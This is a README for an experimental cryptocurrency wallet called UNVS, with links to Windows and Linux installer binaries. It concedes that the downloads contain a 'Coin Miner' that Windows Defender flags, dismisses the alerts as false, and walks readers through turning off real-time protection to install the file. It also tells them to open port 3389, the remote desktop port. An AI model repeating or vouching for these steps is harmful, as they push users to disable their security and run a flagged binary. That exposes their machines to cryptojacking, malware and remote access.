UNVS
=============

✪ FOR ANTIVIRUS ISSUES BLOCKING INSTALL OF MINER, SEE BELOW TO REMEDY ✪


PLEASE NOTE THIS IS STILL A HIGHLY EXPERIMENTAL PROJECT. 
----------------


**DESKTOP WALLET RELEASES**
------------------------------------

These releases have all dependancies compiled within, therefore should run as normal without additional dependancies being required on your system, apart from Linux QT Runtime being required (see below).

**✪✪ FOR WINDOWS 32BIT WALLET ✪✪**


https://github.com/UnvsCom/Wallets/raw/main/unvs-win32-setup.exe

Install and allow through firewall if prompted.

**✪✪ FOR LINUX WALLET ✪✪**

https://github.com/UnvsCom/Wallets/raw/main/unvs-qt-linux-setup

**On Linux 20.04 (Max Version), YOU NEED the Qt4 run-time libraries** to run the UNVS-Qt wallet program. On Debian or Ubuntu enter via terminal:

```
sudo add-apt-repository ppa:rock-core/qt4

sudo apt-get install libqtgui4
```
**(We are currently building a QT5 compatible Wallet, So currently only works on Ubuntu 20.04 & earlier releases.)**

Both Wallets should auto sync via the hardcoded IP nodes and DNS Seeders. Do not add random untrusted IP nodes manually to speed up syncing! Only add our OFFICIAL IPs stated on our website at [UNVS.com/wallet-guide](https://www.unvs.com/wallet-guide)

You can unzip our compressed **tar.gz** folders by utilizing: https://www.7-zip.org/download.html

**✪✪ IN SOME CASES MAY NEED TO OPEN PORTS ✪✪**

```
sudo ufw allow 3389/tcp

sudo ufw allow 2333/tcp

sudo ufw allow 2332/tcp

```


✪ 'COINMINER' ANTIVIRUS ISSUES - DOWNLOAD ISSUES SIDENOTE ✪
--------
Sometimes operating systems don't like supporting cryptocurrency software due to their mining scripts and abilities.

With that being said our download files/folders sometimes provide false Windows Defender virus alerts due to them containing a **Coin Miner**

When this occurs Windows can either refuse to install the Wallet or even fully refuse to allow a download of the tar.gz or installation file.

If you believe that a file you downloaded is genuine, you can bypass the **“Operation did not complete successfully because the file contains a virus”** warning. To do this, you’ll have to temporarily disable Windows Defender, and open the file while it’s turned off.


✪ **Workaround Method 1. Temporarily Disable Windows Defender** ✪ 
<br>            
**WINDOWS 10 / 11.**
1) Go to Windows **'Start'** menu & choose **Settings**, or alternatively **use the Windows + i shortcut**.


2) On the left click on **'Privacy & Security'**

3) At the top click **'Windows Security'**

4) Then click on **'Virus & threat protection'**

5) First, click on the **'Manage settings'** link under the **'Virus & threat protection'** settings header. 

6) You’ll be redirected to a new page. Here, **click on the Real-time protection toggle to turn off Windows Defender**.

Then you should be able to download and install freely. You can even activate Windows Defender after installation. Ensure to allow connections through any firewall.

For a PDF menu navigation guide, see here: https://github.com/UnvsCom/Current-Wallet-Releases/blob/main/BYPASS-DEFENDER.pdf


✪ Also remember to read our Wallet Guides ✪
----------------------------------------------

https://github.com/UnvsCom/Wallets/blob/main/WALLET-COMMANDS.md

https://github.com/UnvsCom/Wallets/blob/main/WALLET-INSTALLATIONS.md

https://github.com/UnvsCom/Wallets/blob/main/conf-FILE-SETTINGS.md


✪ SPEEDING UP CHAIN SYNC ✪
----------------------------------------------
It may be possible to jump ahead with your current fresh wallet install sync, by using our Official zipped archive of our chain.
We will endevour to update this on a regular basis. The archive can be found here:

https://github.com/UnvsCom/Chain-Archive-Snapshot-ZIP
 
✪ FINAL NOTES! ✪
----------------------------------------------
WE ARE STILL IN DEVELOPMENT STAGES. USE AT YOUR OWN RISK. WE ACCEPT NO LIABILITY IN ANY INSTANCE & NO GUARANTEE NOR WARRANTY IS PROVIDED. DEVELOPED FOR ENTERTAINMENT - USE IT FOR FUN !</b>

https://UNVS.com

Copyright (c) 2009-2014 Bitcoin Developers.
 
Copyright (c) 2011-2014 Litecoin Developers.  

Copyright (c) 2023 UNVS Developers.


**WITH ALL THAT BEING SAID, USE AT YOUR OWN RISK! THIS IS HIGHLY EXPERIMENTAL CRYPTOCURRENCY SOFTWARE FOR DEVELOPERS.
PROVIDED WITHOUT ANY WARRANTY OR GUARANTEE AND WITHOUT ANY LIABILITY.**

